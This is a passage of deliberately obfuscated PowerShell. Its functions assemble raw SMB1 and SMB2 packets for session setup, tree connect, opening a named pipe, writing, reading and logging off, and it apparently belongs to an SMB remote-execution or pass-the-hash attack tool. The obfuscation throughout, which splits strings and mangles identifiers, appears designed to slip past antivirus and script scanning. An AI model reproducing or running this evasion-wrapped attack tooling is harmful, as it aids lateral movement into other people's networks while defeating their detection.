        ${PAC`ket_sMBs`ESSI`O`Ns`Etu`paNdx`RE`Qu`eSt}.("{1}{0}" -f 'dd','A').Invoke(("{8}{5}{0}{3}{7}{4}{6}{2}{1}"-f 'BSess','nd','Comma','ion','pAndXReq','M','uest_AndX','Setu','S'),[Byte[]](0xff))
        ${P`A`ckE`T_SMBseSSI`OnS`ETUPandX`REqU`eST}.("{0}{1}" -f 'Ad','d').Invoke(("{2}{6}{3}{1}{5}{4}{0}"-f 'est_Reserved','tupAndX','S','SessionSe','u','Req','MB'),[Byte[]](0x00))
        ${Pac`KET`_S`mB`sEsS`IONse`TUpaN`D`Xre`qU`EST}.("{1}{0}"-f 'd','Ad').Invoke(("{7}{6}{8}{4}{0}{2}{5}{3}{9}{1}"-f'up','set','AndX','equest_And','Set','R','io','SMBSess','n','XOff'),[Byte[]](0x00,0x00))
        ${P`Acket`_smBSeSsIoNSeT`UpA`N`dXrEQuEST}.("{1}{0}" -f'd','Ad').Invoke(("{6}{5}{0}{1}{4}{2}{3}"-f 'XRequest','_','ffe','r','MaxBu','pAnd','SMBSessionSetu'),[Byte[]](0xff,0xff))
        ${pACkeT`_sM`BS`Essions`EtUP`AndxrEquest}.("{0}{1}"-f'Ad','d').Invoke(("{6}{8}{0}{1}{5}{7}{2}{3}{4}" -f 'An','dXR','_Ma','xMpxCou','nt','eq','SMBSess','uest','ionSetup'),[Byte[]](0x02,0x00))
        ${P`ACk`e`T_SmBSESs`iONseTUpa`Ndx`RE`Q`UE`ST}.("{1}{0}" -f'd','Ad').Invoke(("{8}{2}{4}{3}{1}{7}{0}{5}{6}"-f'quest_VCN','upAndX','ss','Set','ion','u','mber','Re','SMBSe'),[Byte[]](0x01,0x00))
        ${PA`cKEt_`SmBseSsIOnsetup`A`NdXREqUE`St}.("{1}{0}" -f 'dd','A').Invoke(("{7}{1}{0}{3}{2}{6}{4}{5}"-f 'onSe','Sessi','pAn','tu','XR','equest_SessionKey','d','SMB'),[Byte[]](0x00,0x00,0x00,0x00))
        ${pacKE`T_sMbSEsS`ionsEtuP`ANdXR`e`QuesT}.("{0}{1}"-f'A','dd').Invoke(("{3}{5}{2}{7}{1}{4}{0}{6}" -f 'lob','est_Secur','etu','SMBSessi','ityB','onS','Length','pAndXRequ'),${pacKeT_B`ytE_`Cou`NT})
        ${PackeT`_smbs`eSs`ION`sETUpANDxREquE`sT}.("{0}{1}" -f 'A','dd').Invoke(("{0}{1}{2}{4}{5}{6}{3}"-f'S','MBS','e','served2','ssionSetu','pAnd','XRequest_Re'),[Byte[]](0x00,0x00,0x00,0x00))
        ${P`AC`ket_`sMBsEs`S`Io`N`S`etUPANdxrequest}.("{1}{0}" -f 'dd','A').Invoke(("{8}{4}{3}{1}{7}{2}{5}{0}{6}"-f 'ilit','on','tupAndXR','i','MBSess','equest_Capab','ies','Se','S'),[Byte[]](0x44,0x00,0x00,0x80))
        ${pA`cKEt_S`mBSE`SsIONSe`TU`P`ANd`xReQu`EST}.("{1}{0}" -f'd','Ad').Invoke(("{4}{5}{1}{2}{0}{3}" -f 'yteCoun','etupAn','dXRequest_B','t','SMBS','essionS'),${PAC`ket_s`eCU`RiTy`_`Bl`Ob_`LeNgtH})
        ${pAckET_S`mbSes`SI`OnsEtUpaN`dx`R`eqUEsT}.("{1}{0}" -f'dd','A').Invoke(("{2}{5}{7}{4}{0}{1}{6}{3}" -f 'uest_Secu','ri','SMBS','lob','AndXReq','essionSe','tyB','tup'),${paCk`eT`_S`e`CurITy_bloB})
        ${pAc`k`et_s`Mb`sesSIonSET`U`pAn`d`XReQueST}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{2}{10}{9}{4}{5}{7}{8}{6}{3}{0}"-f 'eOS','SMB','Se','ativ','nSe','t','t_N','upAnd','XReques','io','ss'),[Byte[]](0x00,0x00,0x00))
        ${pACKet`_smbS`EsS`iOn`S`eTuPANDxR`EquESt}.("{0}{1}" -f'Ad','d').Invoke(("{0}{6}{5}{7}{3}{12}{8}{10}{9}{11}{4}{1}{2}"-f'SM','ANMa','nage','nSe','L','S','B','essio','ndX','t_Na','Reques','tive','tupA'),[Byte[]](0x00,0x00))

        return ${pac`keT_`SmBsEss`IO`Nse`Tu`PAN`dxreQ`UEst} 
    }

    function g`eT`-PackEt`smbTrE`e`ConNECtaNDxr`eqU`EsT()
    {
        param([Byte[]]${Pa`C`kET_P`ATh})

        [Byte[]]${p`Ac`KET_PatH_lENG`TH} =   ( &("{1}{0}{2}" -f'ariABL','v','e')  ('W'+'2EHx') )."vAl`Ue"::("{1}{2}{0}"-f 's','Get','Byte').Invoke(${P`A`cKEt_paTH}."l`En`Gth" + 7)
        ${P`AcKeT_`p`AtH`_LE`NgTH} = ${P`ACke`T_`paTh_L`enGtH}[0,1]

        ${p`AcK`Et_sMBtre`eCONnECTan`Dx`RequeSt} = &("{0}{1}{2}" -f 'New-Obje','c','t') ("{4}{1}{8}{3}{0}{7}{5}{2}{9}{6}" -f'li','.S','d.Or','cia','System.Collections','e','ry','z','pe','deredDictiona')
        ${PAC`ket_smbTr`E`e`connEc`TAndXr`E`qUesT}.("{0}{1}"-f 'A','dd').Invoke(("{0}{6}{5}{3}{2}{4}{1}{7}"-f 'SMB','n','est_Wo','qu','rdCou','Re','TreeConnectAndX','t'),[Byte[]](0x04))
        ${PacKe`T_Smb`TRE`Eco`Nnect`And`XrEQuEST}.("{1}{0}"-f'dd','A').Invoke(("{2}{6}{5}{1}{0}{4}{3}"-f 'equ','XR','SMBTreeCo','t_AndXCommand','es','ectAnd','nn'),[Byte[]](0xff))
        ${pAck`E`T_S`MBtrEEC`oNNecta`NDXREQUe`St}.("{1}{0}" -f 'd','Ad').Invoke(("{3}{0}{7}{6}{4}{2}{1}{5}" -f'BTreeConnec','s','st_Re','SM','e','erved','u','tAndXReq'),[Byte[]](0x00))
        ${PAcKeT_`Smb`TReEcOnnectA`NdXr`EqU`eSt}.("{1}{0}"-f'dd','A').Invoke(("{4}{5}{0}{1}{2}{3}{6}" -f'tA','nd','XRequest_AndXOffs','e','SMBTreeCo','nnec','t'),[Byte[]](0x00,0x00))
        ${PA`cKEt_`sM`B`TR`e`E`coNNECT`ANDXreqUE`st}.("{1}{0}"-f 'dd','A').Invoke(("{4}{3}{6}{2}{0}{5}{1}"-f 'tAn','Request_Flags','ec','Tree','SMB','dX','Conn'),[Byte[]](0x00,0x00))
        ${Pac`ket_s`MbtR`EeConnE`c`T`ANdX`Requ`ESt}.("{0}{1}"-f'Ad','d').Invoke(("{7}{6}{3}{1}{2}{0}{4}{8}{5}"-f's','nnec','tAndXReque','Co','t_Passw','h','MBTree','S','ordLengt'),[Byte[]](0x01,0x00))
        ${PacKET`_S`mBtr`EECO`NnecTaNDxR`E`q`Ue`sT}.("{0}{1}"-f'Ad','d').Invoke(("{1}{4}{5}{0}{2}{3}" -f'tAndXRequ','SM','est','_ByteCount','BTreeCo','nnec'),${P`AcKet_PATH_`lE`N`GtH})
        ${PAc`K`E`T`_s`mbt`ReECoNneCtAnD`Xreq`UeST}.("{0}{1}"-f 'A','dd').Invoke(("{4}{3}{5}{8}{7}{1}{2}{9}{0}{6}" -f 'or','t_Pa','s','B','SM','TreeConnectA','d','Reques','ndX','sw'),[Byte[]](0x00))
        ${PacKet`_`SMbt`Ree`c`oNneC`TANDX`R`EQ`UEst}.("{1}{0}"-f'd','Ad').Invoke(("{4}{3}{2}{1}{0}{5}"-f 'uest_','q','nectAndXRe','Con','SMBTree','Tree'),${pA`c`KeT_p`ATh})
        ${P`AC`KET_sMb`TR`EEcON`NECTan`DXr`EqUeSt}.("{1}{0}"-f'd','Ad').Invoke(("{7}{6}{5}{4}{8}{1}{0}{9}{3}{2}"-f 'Se','est_','ce','vi','ectA','nn','BTreeCo','SM','ndXRequ','r'),[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

        return ${Pa`Cket_`sMB`T`REEcoNNEc`TaNdxrequ`e`ST}
    }

    function gET-PaCK`e`T`sm`BNTcrEAt`EaN`DXre`q`U`eSt()
    {
        param([Byte[]]${PaCKE`T`_nA`meD`_pIPE})

        [Byte[]]${PaC`Ket_NAm`eD_pi`PE_`L`eNgth} =   ( &("{2}{1}{0}"-f 'AbLE','ri','Va') w2eHx  )."va`LUe"::("{2}{0}{1}"-f'etB','ytes','G').Invoke(${pacKeT_namE`d`_PI`pe}."LEnG`Th")
        ${PaCkeT_N`A`mE`D_`p`ipe_leNG`TH} = ${p`A`C`K`et_naM`eD_P`IpE_LEN`Gth}[0,1]
        [Byte[]]${PACk`eT_fil`E_NAmE`_LeNg`Th} =  ${W2E`HX}::("{0}{2}{1}" -f 'G','tBytes','e').Invoke(${P`A`CKeT_N`AmE`D_`PIpE}."LEn`gtH" - 1)
        ${paC`kEt_Fi`LE_`Na`mE_le`NGth} = ${pack`Et_`FIl`e_nam`E_Len`gTh}[0,1]

        ${PA`ck`e`T_SmbnTC`R`e`ATEANDxr`EQUE`St} = &("{2}{1}{0}"-f 'ct','w-Obje','Ne') ("{7}{4}{10}{5}{8}{3}{1}{9}{6}{0}{2}" -f'tionar','ecializ','y','Sp','st','m.Col','redDic','Sy','lections.','ed.Orde','e')
        ${p`A`CK`eT_sMBnTC`Reat`E`AnDXrEQ`UE`st}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}{7}{3}{4}{5}{6}{2}{8}"-f'BN','SM','un','re','ateAndXReq','uest_W','ordCo','TC','t'),[Byte[]](0x18))
        ${p`Acke`T_sMbNT`CrEA`Tea`N`DXRequE`st}.("{0}{1}"-f 'A','dd').Invoke(("{4}{6}{3}{2}{5}{8}{1}{7}{0}"-f'nd','uest','Create','NT','SM','An','B','_AndXComma','dXReq'),[Byte[]](0xff))
        ${P`ACK`et_SM`BNT`c`ReATEaNDX`R`EQu`ESt}.("{1}{0}" -f'dd','A').Invoke(("{5}{2}{3}{6}{1}{0}{4}"-f 'rve','se','BNTCreateAndX','Reques','d','SM','t_Re'),[Byte[]](0x00))
        ${P`ACKE`T_SmbNT`CReAT`e`ANdxreQU`EsT}.("{1}{0}"-f'dd','A').Invoke(("{2}{4}{5}{0}{1}{3}" -f't_And','XOf','SMBNTCreateAndX','fset','Reque','s'),[Byte[]](0x00,0x00))
        ${p`Ac`KE`T_sMBntCReAteaNDXREq`UEST}.("{1}{0}" -f 'dd','A').Invoke(("{0}{4}{2}{3}{1}{5}"-f'SM','d','Crea','teAndXRequest_Reserve','BNT','2'),[Byte[]](0x00))
        ${pAck`ET`_s`m`BNtcrEATe`AnD`XRE`Que`ST}.("{1}{0}" -f'd','Ad').Invoke(("{5}{0}{6}{1}{10}{9}{7}{2}{3}{8}{4}"-f'M','N','est_F','il','meLen','S','B','qu','eNa','reateAndXRe','TC'),${P`AC`K`E`T`_fILE_naME_L`eNgTh})
        ${P`AckeT`_sm`BnT`CREATE`ANdx`Re`Q`UeST}.("{1}{0}"-f'd','Ad').Invoke(("{2}{1}{4}{3}{0}{6}{5}{7}"-f'd','e','SMBNTCreat','n','A','st_Creat','XReque','eFlags'),[Byte[]](0x16,0x00,0x00,0x00))
        ${PaCk`ET_sMBn`TCreA`TeandXREq`U`E`ST}.("{0}{1}" -f 'Ad','d').Invoke(("{6}{5}{0}{3}{1}{2}{4}"-f'eques','tF','I','t_Roo','D','XR','SMBNTCreateAnd'),[Byte[]](0x00,0x00,0x00,0x00))
        ${p`A`cKeT_SMbn`TCrE`A`T`eaN`D`X`ReqUEST}.("{1}{0}" -f'd','Ad').Invoke(("{3}{5}{2}{4}{0}{1}{6}" -f'ssM','a','AndXRequest_Acc','SMBNTC','e','reate','sk'),[Byte[]](0x00,0x00,0x00,0x02))
        ${PaCK`e`T_sm`Bnt`cRE`A`TeA`NDXrequ`Est}.("{1}{0}" -f'dd','A').Invoke(("{5}{2}{6}{0}{3}{4}{1}"-f'dX','e','TCre','Request_Allocati','onSiz','SMBN','ateAn'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${PacKEt_smBNTC`RE`AtEAn`dXrE`QuEsT}.("{1}{0}" -f'dd','A').Invoke(("{8}{9}{6}{1}{0}{5}{2}{7}{4}{3}" -f'ndXRequest_','ateA','leA','utes','rib','Fi','re','tt','S','MBNTC'),[Byte[]](0x00,0x00,0x00,0x00))
        ${PACKET_smbN`TCr`e`ATe`ANdxr`eQUE`st}.("{0}{1}" -f 'A','dd').Invoke(("{5}{7}{3}{4}{9}{1}{2}{0}{8}{6}{10}" -f 'eA','quest','_Shar','teAnd','X','S','ce','MBNTCrea','c','Re','ss'),[Byte[]](0x07,0x00,0x00,0x00))
        ${PaCK`E`T_`SM`BnT`Create`ANdxREQu`e`ST}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{8}{5}{0}{3}{4}{2}{7}{6}"-f'nd','SMBNT','est_Dispos','XReq','u','ateA','tion','i','Cre'),[Byte[]](0x01,0x00,0x00,0x00))
        ${pAck`ET_`sm`BnTcR`EAT`e`A`NDxREqueST}.("{0}{1}"-f'Ad','d').Invoke(("{8}{1}{7}{2}{3}{0}{6}{4}{5}" -f 'ea','AndXR','st_','Cr','t','ions','teOp','eque','SMBNTCreate'),[Byte[]](0x00,0x00,0x00,0x00))
        ${P`AcK`eT_smBNt`CR`EATEAndXREquEST}.("{0}{1}" -f 'A','dd').Invoke(("{4}{0}{1}{6}{7}{3}{2}{5}"-f 'MBN','TCreate','r','pe','S','sonation','AndXRequest','_Im'),[Byte[]](0x02,0x00,0x00,0x00))
        ${paCket_smb`NTCRe`A`T`eA`NDXr`eQueST}.("{1}{0}"-f 'dd','A').Invoke(("{8}{3}{6}{7}{4}{5}{0}{9}{2}{10}{1}" -f 'equ','Flags','uri','ea','ndX','R','t','eA','SMBNTCr','est_Sec','ty'),[Byte[]](0x00))
        ${pA`cKET_S`mBNtc`Reate`AnDX`REQuEsT}.("{1}{0}"-f 'dd','A').Invoke(("{5}{3}{1}{0}{6}{7}{4}{2}"-f'eques','R','t','BNTCreateAndX','un','SM','t_Byt','eCo'),${p`AcKE`T_NA`M`Ed_`PIPE_`LEngTH})
        ${pA`cK`Et_s`mBNtCrEateaNDxrEqUe`sT}.("{1}{0}" -f'd','Ad').Invoke(("{3}{5}{4}{1}{8}{0}{7}{2}{6}"-f 'il','dXRequest_','a','SM','teAn','BNTCrea','me','en','F'),${pacKE`T_Na`m`e`d_pipE})

        return ${pacKET_`sMBNTCrEat`E`AN`dXReqU`EsT}
    }

    function gEt-`pACke`TS`mbREAdAn`DXR`eQUE`St()
    {
        ${PAckE`T_SM`Br`E`ADaN`DXReq`Ue`St} = &("{2}{0}{1}"-f '-Obj','ect','New') ("{1}{3}{6}{5}{4}{2}{7}{0}"-f'ry','System.Collec','t','ti','ic','pecialized.OrderedD','ons.S','iona')
        ${PaCk`Et_SmbREa`dAnd`x`RequEST}.("{0}{1}"-f'A','dd').Invoke(("{1}{5}{4}{0}{2}{6}{3}"-f 'ReadAndXReq','S','uest_Wo','t','B','M','rdCoun'),[Byte[]](0x0a))
        ${P`AcKEt_sMBr`eAdAnd`xreqU`est}.("{1}{0}" -f'dd','A').Invoke(("{0}{4}{1}{3}{2}"-f 'SMBReadAnd','st_','and','AndXComm','XReque'),[Byte[]](0xff))
        ${pAc`KET_`SM`BReAda`NdxRe`qUEsT}.("{0}{1}" -f 'A','dd').Invoke(("{2}{5}{0}{4}{1}{3}"-f 'eque','e','SMB','rved','st_Res','ReadAndXR'),[Byte[]](0x00))
        ${PACkE`T_SmbRE`A`DAND`xrequEST}.("{0}{1}"-f 'Ad','d').Invoke(("{6}{1}{3}{0}{2}{4}{5}" -f 'que','dAndXR','st','e','_','AndXOffset','SMBRea'),[Byte[]](0x00,0x00))
        ${P`A`cK`et_`smBREada`Ndx`ReQuesT}.("{1}{0}" -f 'dd','A').Invoke(("{3}{6}{4}{1}{5}{0}{2}"-f'q','adAn','uest_FID','SM','e','dXRe','BR'),[Byte[]](0x00,0x40))
        ${P`Ack`Et_SM`BReaDaNDxReqUE`ST}.("{0}{1}"-f 'A','dd').Invoke(("{3}{5}{1}{2}{6}{0}{4}{7}" -f't_Off','dX','R','SMBRea','s','dAn','eques','et'),[Byte[]](0x00,0x00,0x00,0x00))
        ${P`AckeT_SmB`RE`AD`AnDXreQu`Est}.("{0}{1}" -f'Ad','d').Invoke(("{1}{7}{8}{3}{4}{5}{0}{6}{2}" -f 'st_Max','SMBRe','Low','n','dXRe','que','Count','a','dA'),[Byte[]](0x58,0x02))
        ${PAC`KET`_sm`Br`eADANDX`REQ`Ue`sT}.("{1}{0}" -f 'dd','A').Invoke(("{6}{4}{0}{3}{2}{7}{8}{5}{1}" -f 'ndX','ount','u','Req','MBReadA','C','S','est','_Min'),[Byte[]](0x58,0x02))
        ${pA`cK`eT_SMbreADANdXR`eQ`UEST}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{5}{3}{6}{2}{4}{1}" -f'S','own','t_Unk','adAnd','n','MBRe','XReques'),[Byte[]](0xff,0xff,0xff,0xff))
        ${paC`KeT_SmBr`e`ADaNdxR`EQU`ESt}.("{1}{0}"-f'dd','A').Invoke(("{5}{3}{1}{6}{0}{2}{4}{7}{8}"-f'R','a','equ','Re','e','SMB','dAndX','st_Remain','ing'),[Byte[]](0x00,0x00))
        ${P`A`CkE`T_sMb`Re`A`Da`N`dxrEQUest}.("{1}{0}"-f'dd','A').Invoke(("{3}{5}{0}{4}{2}{1}{6}"-f'ReadAnd','_ByteCoun','t','S','XReques','MB','t'),[Byte[]](0x00,0x00))

        return ${pACkeT_`sMbre`AD`ANdXrEQuE`ST}
    }

    function g`et-`P`Ack`EtSMBw`RitEanDxr`EqUEst()
    {
        param([Byte[]]${PAckEt_Fi`lE`_id},[Int]${PAC`K`et`_rP`C_length})

        [Byte[]]${pAckEt_W`RI`TE_L`EnGth} =   (  &("{0}{1}" -f 'DI','R')  ("VAr"+"IaBL"+"E:w"+"2"+"eHx") )."V`ALUE"::("{1}{0}{2}"-f'yt','GetB','es').Invoke(${pACkET`_r`PC_lE`NgTh})
        ${PaCKet`_WRi`TE`_L`E`N`gTh} = ${PA`C`k`e`T_wRi`Te_lENgTh}[0,1]

        ${pack`Et`_`SMbWRITEand`XreQU`eST} = &("{1}{3}{0}{2}"-f'c','Ne','t','w-Obje') ("{5}{3}{11}{12}{6}{9}{13}{1}{2}{7}{0}{10}{8}{4}"-f'r','ialized.','Ord','.Colle','nary','System','s.','e','ictio','Sp','edD','ctio','n','ec')
        ${p`A`ckeT_SmBWritE`A`NDxRe`QU`Est}.("{0}{1}"-f'Ad','d').Invoke(("{7}{2}{3}{0}{6}{5}{8}{1}{4}" -f 'n','ques','te','A','t_WordCount','XR','d','SMBWri','e'),[Byte[]](0x0e))
        ${P`AcK`Et`_smbwriT`EANdXREQUesT}.("{1}{0}" -f'd','Ad').Invoke(("{0}{2}{1}{3}{6}{5}{4}"-f'SM','riteAndXRequest_','BW','AndXCom','d','an','m'),[Byte[]](0xff))
        ${P`ACkE`T_sM`BWrItean`dXRequ`EsT}.("{1}{0}"-f'd','Ad').Invoke(("{0}{5}{6}{1}{4}{3}{2}"-f'SM','qu','eserved','_R','est','BWriteA','ndXRe'),[Byte[]](0x00))
        ${p`ACKET_sMBW`R`I`TEA`NDx`RequEst}.("{1}{0}"-f 'dd','A').Invoke(("{1}{3}{8}{0}{4}{6}{7}{2}{5}" -f'AndX','SMBW','XO','rit','Requ','ffset','e','st_And','e'),[Byte[]](0x00,0x00))
        ${PA`CKeT_`sM`Bwr`i`Teandx`Req`UESt}.("{0}{1}"-f'A','dd').Invoke(("{1}{0}{4}{3}{2}"-f 'eque','SMBWriteAndXR','ID','_F','st'),${P`AcK`et_f`Ile_id})
        ${paC`KeT_`sm`BwRi`T`EandXreQU`e`sT}.("{1}{0}" -f 'd','Ad').Invoke(("{5}{0}{3}{1}{7}{2}{6}{4}"-f'WriteAndXR','es','O','equ','et','SMB','ffs','t_'),[Byte[]](0xea,0x03,0x00,0x00))
        ${Pa`C`kEt_smbw`RiteAn`D`X`ReQU`E`ST}.("{0}{1}" -f'Ad','d').Invoke(("{1}{2}{0}{7}{3}{5}{6}{4}"-f 'r','SM','BW','eAndXReq','_Reserved2','ues','t','it'),[Byte[]](0xff,0xff,0xff,0xff))
        ${pA`cKET_SMB`WRiTEanDXr`eQuE`st}.("{1}{0}"-f'dd','A').Invoke(("{5}{0}{1}{2}{6}{4}{3}{7}" -f'i','t','eAnd','equest_Wr','R','SMBWr','X','iteMode'),[Byte[]](0x08,0x00))
        ${PAck`e`T_s`mB`WRi`TeANDXrEqUeST}.("{1}{0}"-f 'd','Ad').Invoke(("{1}{2}{3}{4}{0}" -f 'ing','SMBW','r','i','teAndXRequest_Remain'),${P`A`C`KEt_wR`iTE`_leNgth})
        ${p`Ac`KET_S`M`Bw`Ri`TEAndX`REQuESt}.("{1}{0}" -f'dd','A').Invoke(("{0}{6}{1}{5}{4}{7}{3}{2}" -f'SMB','iteAndXRe','thHigh','ng','s','que','Wr','t_DataLe'),[Byte[]](0x00,0x00))
        ${pAckE`T`_sM`BWriTea`NDxrEqUe`ST}.("{0}{1}"-f'Ad','d').Invoke(("{5}{3}{0}{1}{7}{6}{2}{4}" -f 'R','equest','ng','MBWriteAndX','thLow','S','ataLe','_D'),${paCkEt_w`RI`TE_Le`NGtH})
        ${PA`CKeT`_`SMBwRitEaNDXr`EQuE`st}.("{0}{1}"-f'A','dd').Invoke(("{0}{3}{2}{4}{1}"-f'SMBWriteAndXR','set','ues','eq','t_DataOff'),[Byte[]](0x3f,0x00))
        ${pa`Cke`T_Smb`WRI`TEANDXReQu`e`ST}.("{0}{1}" -f 'Ad','d').Invoke(("{4}{1}{2}{7}{8}{9}{5}{6}{3}{0}" -f'et','MBWri','te','HighOffs','S','quest','_','And','XR','e'),[Byte[]](0x00,0x00,0x00,0x00))
        ${Pa`C`K`ET_`SmBwRi`TeA`NDxr`EQueST}.("{1}{0}"-f'dd','A').Invoke(("{3}{5}{4}{2}{0}{6}{7}{1}{8}" -f 'st','n','ndXReque','SMB','teA','Wri','_By','teCou','t'),${P`ACKET`_`WR`itE_le`NgtH})

        return ${PAck`ET`_sMb`wr`I`TEaN`DxrEQUeSt}
    }

    function gET-P`A`CK`ETS`mBcL`Oser`eQuESt()
    {
        param ([Byte[]]${Pac`K`Et`_fil`e_ID})

        ${Pa`CkeT_smbCLosEr`EQ`UE`st} = &("{3}{1}{0}{2}" -f 'bjec','-O','t','New') ("{2}{8}{5}{3}{1}{0}{4}{6}{7}"-f '.Ord','lized','Sys','ia','eredDictiona','s.Spec','r','y','tem.Collection')
        ${p`AckET_s`M`BCloSeReqUe`ST}.("{1}{0}" -f 'dd','A').Invoke(("{4}{0}{3}{1}{2}" -f'MBCloseReq','dC','ount','uest_Wor','S'),[Byte[]](0x03))
        ${PaCKe`T_s`M`BCL`OsERE`qUEst}.("{0}{1}" -f'A','dd').Invoke(("{3}{4}{0}{1}{2}" -f 'eRequest','_FI','D','SMB','Clos'),${p`AC`kET_fi`Le_`Id})
        ${Pa`CKET`_`SmbcLosE`REquesT}.("{1}{0}"-f'd','Ad').Invoke(("{5}{2}{0}{4}{1}{7}{6}{3}"-f'BClo','t_La','M','te','seReques','S','i','stWr'),[Byte[]](0xff,0xff,0xff,0xff))
        ${p`ACkEt_`SM`BClOSErEq`UEsT}.("{0}{1}" -f'Ad','d').Invoke(("{3}{0}{4}{1}{2}" -f 'BCloseReques','te','Count','SM','t_By'),[Byte[]](0x00,0x00))

        return ${PacKet`_sMbclO`S`er`EqUEST}
    }

    function GET-`PACketSMbTree`d`iS`C`onn`ECtre`quest()
    {
        ${pAcket`_`SmBtreEd`ISConnec`TReqU`ESt} = &("{1}{0}{2}"-f 'je','New-Ob','ct') ("{5}{2}{6}{1}{8}{3}{4}{0}{7}"-f 'iona','d','m.Collections.Special','edDic','t','Syste','ize','ry','.Order')
        ${PaC`K`eT`_SmB`TReEdiSCOnn`e`c`TR`eQU`eSt}.("{0}{1}" -f'Ad','d').Invoke(("{5}{4}{6}{1}{2}{0}{3}"-f'st_WordC','nectRe','que','ount','Di','SMBTree','scon'),[Byte[]](0x00))
        ${p`ACk`et_SmBtrE`ed`isconNe`C`Tr`Eq`UeST}.("{0}{1}" -f 'A','dd').Invoke(("{9}{4}{10}{2}{7}{8}{6}{0}{5}{1}{3}"-f 'teC','n','Dis','t','MBTre','ou','t_By','connect','Reques','S','e'),[Byte[]](0x00,0x00))

        return ${p`ACkeT`_SMBtRE`eDI`SCOnneCT`REQu`esT}
    }

    function GeT`-P`AckEt`SMBL`O`GOFF`A`Ndx`REqUeSt()
    {
        ${PAC`k`Et_SM`B`lo`gOfFAndXrEqUesT} = &("{2}{1}{0}{3}" -f'w-Ob','e','N','ject') ("{0}{7}{3}{4}{1}{5}{8}{6}{2}" -f 'S','llecti','ry','em.C','o','ons.Specialized.','a','yst','OrderedDiction')
        ${pAckE`T_SM`BlogofFAN`DXREQ`Uest}.("{1}{0}" -f 'dd','A').Invoke(("{2}{5}{9}{1}{8}{3}{4}{7}{0}{6}"-f 'n','s','SMB','ord','C','Logo','t','ou','t_W','ffAndXReque'),[Byte[]](0x02))
        ${PA`CkEt_Sm`Blo`G`off`ANdxreQUEst}.("{0}{1}"-f 'A','dd').Invoke(("{1}{4}{7}{3}{5}{6}{2}{0}"-f 'ommand','S','dXC','dX','M','Req','uest_An','BLogoffAn'),[Byte[]](0xff))
        ${p`ACKe`T_s`M`BLoGOFf`AndxRe`QUest}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{5}{7}{4}{6}{1}{0}{3}" -f 't','es','SMBLo','_Reserved','ndXReq','gof','u','fA'),[Byte[]](0x00))
        ${pA`c`KEt`_SMBLO`goFFAn`dX`Re`QUESt}.("{1}{0}"-f'dd','A').Invoke(("{6}{2}{3}{5}{4}{0}{1}" -f 'equest_An','dXOffset','MBLogoffA','n','R','dX','S'),[Byte[]](0x00,0x00))
        ${p`AckEt_Sm`BlO`GOFfAnD`xrE`qU`EST}.("{1}{0}"-f'dd','A').Invoke(("{4}{0}{3}{5}{6}{1}{2}{7}"-f 'fAnd','te','Coun','XR','SMBLogof','eq','uest_By','t'),[Byte[]](0x00,0x00))

        return ${PACkEt_sm`B`lO`go`FfAn`DXreQU`EST}
    }

    

    function geT-`Pa`ck`Et`sM`B2hEADer()
    {
        param([Byte[]]${P`ACk`eT_`COMMaND},[Int]${pA`c`k`eT_mESs`AGE`_Id},[Byte[]]${PackET_TR`eE`_`Id},[Byte[]]${paC`K`Et_s`ESSIon_Id})

        [Byte[]]${PACKEt_mES`SA`ge`_id} =  (&("{0}{2}{1}" -f 'vaRiAB','E','l')  W2eHx)."val`Ue"::("{0}{1}"-f'GetBy','tes').Invoke(${P`AcKE`T_mes`s`AGE`_Id}) + 0x00,0x00,0x00,0x00

        ${P`A`c`KeT_SM`B`2headEr} = &("{0}{1}{2}" -f 'New-','Objec','t') ("{6}{0}{4}{3}{5}{8}{1}{7}{2}" -f'em.','ed.Ord','Dictionary','ol','C','lections.Spec','Syst','ered','ializ')
        ${pa`ckE`T_`SM`B2HeaD`Er}.("{1}{0}" -f 'd','Ad').Invoke(("{3}{1}{2}{0}" -f'colID','B2Header_Prot','o','SM'),[Byte[]](0xfe,0x53,0x4d,0x42))
        ${paCK`e`T_`Smb2he`ADEr}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}{3}{4}{2}" -f'SMB','2Head','reSize','er_St','ructu'),[Byte[]](0x40,0x00))
        ${pack`E`T_Sm`B`2HEAD`er}.("{0}{1}" -f 'A','dd').Invoke(("{4}{6}{1}{3}{5}{2}{0}" -f'Charge','_','it','Cr','SMB2Head','ed','er'),[Byte[]](0x01,0x00))
        ${Pa`ckET_`SmB2`heAd`ER}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{4}{3}{0}{6}{7}{2}{5}"-f'_Ch','SMB2','nelSequenc','der','Hea','e','a','n'),[Byte[]](0x00,0x00))
        ${paCket`_sMB`2`HEAD`er}.("{1}{0}"-f'd','Ad').Invoke(("{1}{3}{0}{2}"-f'rve','SMB2','d','Header_Rese'),[Byte[]](0x00,0x00))
        ${Pa`CKe`T_sMb2hE`AdeR}.("{0}{1}" -f 'A','dd').Invoke(("{1}{4}{3}{0}{2}"-f 'omm','SMB','and','Header_C','2'),${PACkEt`_`com`ManD})
        ${PacKEt_`s`mB2he`A`DeR}.("{1}{0}" -f'dd','A').Invoke(("{1}{2}{3}{0}{4}{5}" -f'editRe','SMB2H','ea','der_Cr','ques','t'),[Byte[]](0x00,0x00))
        ${p`A`c`Ket_sMB2`heaDER}.("{0}{1}" -f'Ad','d').Invoke(("{2}{1}{3}{0}{4}" -f'ead','B','SM','2H','er_Flags'),[Byte[]](0x00,0x00,0x00,0x00))
        ${PA`cKeT`_SmB`2HeadER}.("{0}{1}"-f'Ad','d').Invoke(("{1}{3}{2}{0}{4}" -f 'xtC','SMB2','_Ne','Header','ommand'),[Byte[]](0x00,0x00,0x00,0x00))
        ${pACk`E`T_s`Mb2HE`Ad`Er}.("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{2}{3}{4}"-f'H','SMB2','eader_','Mess','ageID'),${Pac`K`et_messaGE`_id})
        ${PACKE`T_`sm`B`2he`ADeR}.("{1}{0}"-f 'dd','A').Invoke(("{6}{5}{2}{1}{3}{0}{4}" -f '_Reserved','Hea','2','der','2','B','SM'),[Byte[]](0x00,0x00,0x00,0x00))
        ${P`AckET_`sMB2`He`ADer}.("{0}{1}"-f'A','dd').Invoke(("{2}{0}{1}{3}{4}" -f'MB2H','ead','S','er','_TreeID'),${pac`k`e`T_Tree_Id})
